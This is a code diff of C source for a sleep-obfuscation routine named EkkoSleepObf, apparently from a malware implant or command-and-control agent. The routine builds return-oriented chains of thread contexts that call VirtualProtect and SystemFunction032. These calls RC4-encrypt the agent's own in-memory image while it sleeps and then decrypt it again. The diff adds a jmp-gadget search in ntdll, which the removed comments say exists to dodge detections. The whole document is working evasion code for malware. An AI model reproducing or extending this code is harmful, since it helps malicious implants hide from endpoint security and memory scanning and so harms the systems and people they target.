@@ -45,16 +45,11 @@ BOOL EkkoSleepObf(
 
     Protect = PAGE_EXECUTE_READWRITE;
 
-    // JmpBypass =  TODO implement jump bypass if we can figure out how it works.
-    // jmpbypass is just used to prevent detections where CONTEXT structures point to locations in code such as virtual protect.
-    // we can use a rop gadget i.e. jmp RAX to bypass this detection.
-
-    if(JmpBypass == JMP_RBX) {
+    if(JmpBypass == OBFU_JMP_RBX) {
         JmpPad[1] = 0x23;
     }
 
-    JmpGadget = FindJmpGadget((PVOID)agent->apis->hNtdll + 0x1000, 0x1000*0x1000, JmpPad, sizeof(JmpPad));
-
+    JmpGadget = FindJmpGadget((ULONG_PTR)agent->apis->hNtdll + 0x1000, 0x1000*0x1000, JmpPad, sizeof(JmpPad));
 
     /* Create Random Key for payload encryption during sleep cycle. 16 byte key.*/
     for (BYTE i = 0; i < 16; i++)
@@ -95,25 +90,23 @@ BOOL EkkoSleepObf(
                         goto END;
                     }
 
-                    //TODO implement jmp bypassing. for extra obfuscation.
-
                     //start preparing ROP chains.
                     for (int i = 0; i < 13 + NumSections; i++) //create rop chains for virtual protect number of sections + 2
                     {
                         MemoryCopy(&Rop[i], &TimerCtx, sizeof(CONTEXT));
-                        Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
+                        Rop[i].Rip = (UINT_PTR)JmpGadget;
                         Rop[i].Rsp -= sizeof(PVOID);
                     }
 
                     /* start rop chain with WaitForSingleObject. */
-                   SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pWaitForSingleObjectEx);
+                    SetJmpObfuscation(Inc, agent->apis->pWaitForSingleObjectEx);
                     Rop[Inc].Rcx = (UINT_PTR)EvntStart;
                     Rop[Inc].Rdx = (UINT_PTR)INFINITE;
                     Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                     Inc++;
 
                     //do protect change for entire binary.
-                    SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pVirtualProtect);
+                    SetJmpObfuscation(Inc, agent->apis->pVirtualProtect);
                     Rop[Inc].Rcx = (UINT_PTR)ImgBase;
                     Rop[Inc].Rdx = (UINT_PTR)ImageSize;
                     Rop[Inc].R8 = (UINT_PTR)PAGE_READWRITE;
@@ -121,14 +114,14 @@ BOOL EkkoSleepObf(
                     Inc++;
 
                     /*Encrypt Image */
-                    SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pSystemFunction032);
+                    SetJmpObfuscation(Inc, agent->apis->pSystemFunction032);
                     Rop[Inc].Rcx = (UINT_PTR)&Img;
                     Rop[Inc].Rdx = (UINT_PTR)&Key;
                     Inc++;
 
 
                     /* Sleep */
-                    SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pWaitForSingleObjectEx);
+                    SetJmpObfuscation(Inc, agent->apis->pWaitForSingleObjectEx);
                     Rop[Inc].Rcx = (UINT_PTR)NtCurrentProcess();
                     Rop[Inc].Rdx = (UINT_PTR)(Delay + TimeOut);
                     Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
@@ -136,7 +129,7 @@ BOOL EkkoSleepObf(
 
 
                     /* Decrypt */
-                   SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pSystemFunction032);
+                    SetJmpObfuscation(Inc, agent->apis->pSystemFunction032);
                     Rop[Inc].Rcx = (UINT_PTR)&Img;
                     Rop[Inc].Rdx = (UINT_PTR)&Key;
                     Inc++;
@@ -146,7 +139,7 @@ BOOL EkkoSleepObf(
                     DWORD PrevRegionsLength = 0;
                     while (ProtectArr[index].RegionSize > 0)
                     {
-                        SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pVirtualProtect);
+                        SetJmpObfuscation(Inc, agent->apis->pVirtualProtect);
                         Rop[Inc].Rcx = (UINT_PTR)ImgBase + PrevRegionsLength;
                         Rop[Inc].Rdx = (UINT_PTR)ProtectArr[index].RegionSize;
                         Rop[Inc].R8 = (UINT_PTR)ProtectArr[index].ProtectValue;
@@ -157,7 +150,7 @@ BOOL EkkoSleepObf(
                     }
 
                     /* End Rop Chain */
-                   SetJmpObfuscation(Inc, (UINT_PTR)agent->apis->pNtSetEvent);
+                    SetJmpObfuscation(Inc, agent->apis->pNtSetEvent);
                     Rop[Inc].Rcx = (UINT_PTR)EvntDelay;
                     Rop[Inc].Rdx = (UINT_PTR)NULL;
                     Inc++;
